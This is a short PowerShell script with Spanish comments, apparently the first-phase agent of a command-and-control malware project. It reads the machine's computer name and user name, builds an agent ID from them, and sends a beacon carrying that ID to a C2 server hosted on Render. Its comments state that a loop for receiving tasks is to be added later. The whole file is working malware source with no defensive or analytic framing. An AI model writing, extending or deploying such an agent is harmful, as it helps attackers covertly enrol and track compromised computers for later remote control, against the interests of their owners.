# agent.ps1 (MVP Fase 2 - Placeholder, basado en MVP1 - Renombrado a core_services_mvp2.ps1)
# Este script solo envía un beacon al C2 y luego termina. Eventualmente tendrá bucle de tareas.

# --- CONFIGURACIÓN ---
# Modifica estas variables para que coincidan con tu entorno C2 desplegado en Render
$c2BaseUrl = "https://exa-sw.onrender.com" # Reemplaza con la URL base de tu C2 en Render (ej. "https://mi-c2.onrender.com")
# --------------------

$agentId = try {
    $computerName = $env:COMPUTERNAME
    $userName = $env:USERNAME
    $rawAgentId = "$($computerName)_$($userName)"
    $cleanedAgentId = $rawAgentId -replace '[^a-zA-Z0-9_-]', '' 
    if ([string]::IsNullOrWhiteSpace($cleanedAgentId)) { "UnknownAgent_F2_$(Get-Random)" } else { $cleanedAgentId }
} catch {
    "UnknownAgent_F2_$(Get-Random)" 
}

# Cambiamos la fase para identificar que es el agente placeholder de MVP2
$beaconUrl = "$($c2BaseUrl)/api/updates?uid=$($agentId)&phase=mvp2_agent_placeholder_render"

# Descomenta para depuración
# Write-Host "Intentando enviar beacon a: $beaconUrl"

try {
    Invoke-RestMethod -Uri $beaconUrl -Method Get -TimeoutSec 10 -UseBasicParsing
    # Write-Host "Beacon enviado exitosamente a $beaconUrl"
} catch {
    # Write-Host "Error enviando beacon a $beaconUrl : $($_.Exception.Message)"
}

# El script termina aquí. En la Tarea 2.3 real, aquí comenzaría el bucle while($true).
